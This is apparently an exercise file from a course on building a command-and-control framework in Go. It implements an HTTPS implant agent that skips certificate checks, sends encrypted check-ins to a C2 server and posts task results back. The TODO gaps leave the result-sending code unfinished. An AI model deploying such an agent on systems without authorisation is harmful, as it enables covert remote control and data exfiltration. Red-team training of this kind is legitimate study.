package agent

import (
	"bytes"
	"context"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"strings"

	"c2framework/internals/crypto"
	"c2framework/internals/server"
)

// HTTPSAgent implements the Agent interface for HTTPS
type HTTPSAgent struct {
	serverAddr   string
	client       *http.Client
	sharedSecret string
	// TODO: Add field commandOrchestrators of type map[string]OrchestratorFunc
}

// NewHTTPSAgent creates a new HTTPS agent
func NewHTTPSAgent(serverIP string, serverPort string, sharedSecret string) *HTTPSAgent {
	// Create TLS config that accepts self-signed certificates
	tlsConfig := &tls.Config{
		InsecureSkipVerify: true,
	}

	// Create HTTP client with custom TLS config
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: tlsConfig,
		},
	}

	agent := &HTTPSAgent{
		serverAddr:   fmt.Sprintf("%s:%s", serverIP, serverPort),
		client:       client,
		sharedSecret: sharedSecret,
		// TODO: Assign commandOrchestrators field, instantiate map using make()
	}

	registerCommands(agent) // Register individual commands

	return agent
}

// Send implements Communicator.Send for HTTPS
func (c *HTTPSAgent) Send(ctx context.Context) (json.RawMessage, error) {
	url := fmt.Sprintf("https://%s/", c.serverAddr)

	// Prepare check-in data (could include agent ID, status, etc.)
	checkInData := map[string]interface{}{
		"status": "active",
	}

	plaintext, _ := json.Marshal(checkInData)

	// Encrypt the payload
	encryptedBody, err := crypto.Encrypt(plaintext, c.sharedSecret)
	if err != nil {
		return nil, fmt.Errorf("encrypting payload: %w", err)
	}

	// Create request with encrypted body
	req, err := http.NewRequestWithContext(ctx, "POST", url,
		strings.NewReader(encryptedBody))
	if err != nil {
		return nil, fmt.Errorf("creating request: %w", err)
	}

	req.Header.Set("Content-Type", "application/octet-stream")

	// Sign the request (from previous lesson)
	SignRequest(req, []byte(encryptedBody), c.sharedSecret)

	resp, err := c.client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("sending request: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("server returned status %d", resp.StatusCode)
	}

	// Read encrypted response
	encryptedResponse, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("reading response: %w", err)
	}

	// Decrypt response
	decrypted, err := crypto.Decrypt(string(encryptedResponse), c.sharedSecret)
	if err != nil {
		return nil, fmt.Errorf("decrypting response: %w", err)
	}

	// Unmarshal into HTTPSResponse to validate structure
	var httpsResp server.HTTPSResponse
	if err := json.Unmarshal(decrypted, &httpsResp); err != nil {
		return nil, fmt.Errorf("unmarshaling response: %w", err)
	}

	// Marshal back to json.RawMessage
	jsonData, err := json.Marshal(httpsResp)
	if err != nil {
		return nil, fmt.Errorf("marshaling response: %w", err)
	}

	return json.RawMessage(jsonData), nil
}

// SendResult performs a POST request to send task results back to server
func (agent *HTTPSAgent) SendResult(resultData []byte) error {
	targetURL := fmt.Sprintf("https://%s/results", agent.serverAddr)

	log.Printf("|RETURN RESULTS|-> Sending %d bytes of results via POST to %s", len(resultData), targetURL)

	// Create the HTTP POST request
	// TODO: create our HTTP POST request (req) using http.NewRequest()
	if err != nil {
		log.Printf("|ERR SendResult| Failed to create results request: %v", err)
		return fmt.Errorf("failed to create http results request: %w", err)
	}

	// Set the headers
	req.Header.Set("Content-Type", "application/json")

	// Execute the request
	// TODO: Send the request using agent.client.Do(), log response
	if err != nil {
		log.Printf("|ERR| Results POST request failed: %v", err)
		return fmt.Errorf("http results post request failed: %w", err)
	}
	defer resp.Body.Close() // Close body even if we don't read it, to release resources

	log.Printf("SUCCESSFULLY SENT FINAL RESULTS BACK TO SERVER.")
	return nil
}
